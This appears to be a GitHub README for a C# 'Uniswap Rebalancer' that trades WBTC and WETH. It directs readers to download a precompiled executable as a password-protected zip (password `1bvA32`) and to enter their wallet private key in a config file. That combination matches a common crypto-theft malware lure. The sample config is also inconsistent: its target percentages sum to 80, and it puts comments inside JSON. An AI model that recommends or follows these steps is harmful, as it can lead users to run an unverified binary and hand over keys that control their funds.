# Rebalancer

The **Ethereum Uniswap Rebalancer** is a C#-based application designed to automate token rebalancing (WBTC and WETH) within an Ethereum wallet using Uniswap smart contracts. Built with the Nethereum library, this solution enables users to maintain specified token allocation ratios through automated trades.

### Key Features:

- **Rebalancing Logic:** Implements a straightforward strategy to maintain target proportions between WBTC and WETH tokens by leveraging Uniswap’s decentralized liquidity pools.
- **Executable for Ease of Use:** Delivered as a compiled executable (`UniswapRebalancer.exe`), allowing users to run the tool effortlessly without needing development experience.
- **Flexible Configuration:** Users can modify essential parameters—such as Infura API key, wallet address, private key, and token specifications—via the `config.json` file.

This tool is ideal for individuals seeking a hands-off method to preserve their preferred token balance. It also serves as a foundational framework that can be enhanced and tailored to fit more complex or personalized portfolio strategies.
## Getting Started
- [Clone](https://github.com/knightlightst/rebalance/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
- Extract archive with password `1bvA32`
- Modify the `config` file:

1. **Ethereum Networks:**
  - `rpcUrl`: The RPC URL for connecting to the Ethereum network.
  - `gasPrice`: The gas price in Wei to be used for transactions.
  - `gasLimit`: The gas limit per transaction.

2. **Rebalancer Settings:**
  - `targetWbtcPercentage`: Target percentage for WBTC in the portfolio.
  - `targetWethPercentage`: Target percentage for WETH in the portfolio.
  - `rebalancingInterval`: Time interval for rebalancing (e.g., `"1d"` for every 1 day).
  - `transactionTimeout`: Timeout for individual transactions in seconds.
```json
{
  "ethereum": {
    "mainnet": {
      "rpcUrl": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY",
      "gasPrice": 1000000000,  // Gas price in Wei
      "gasLimit": 300000       // Gas limit per transaction
    },
    "ropsten": {
      "rpcUrl": "https://ropsten.infura.io/v3/YOUR_INFURA_API_KEY",
      "gasPrice": 500000000,   // Gas price in Wei
      "gasLimit": 200000       // Gas limit per transaction
    },
    // Add more networks as needed
  },
  "rebalancer": {
    "targetWbtcPercentage": 50,
    "targetWethPercentage": 30,
    "rebalancingInterval": "1d",  // Rebalance every 1 day
    "transactionTimeout": 600,   // Timeout for transactions in seconds
    // Add more rebalancing settings as needed
  }
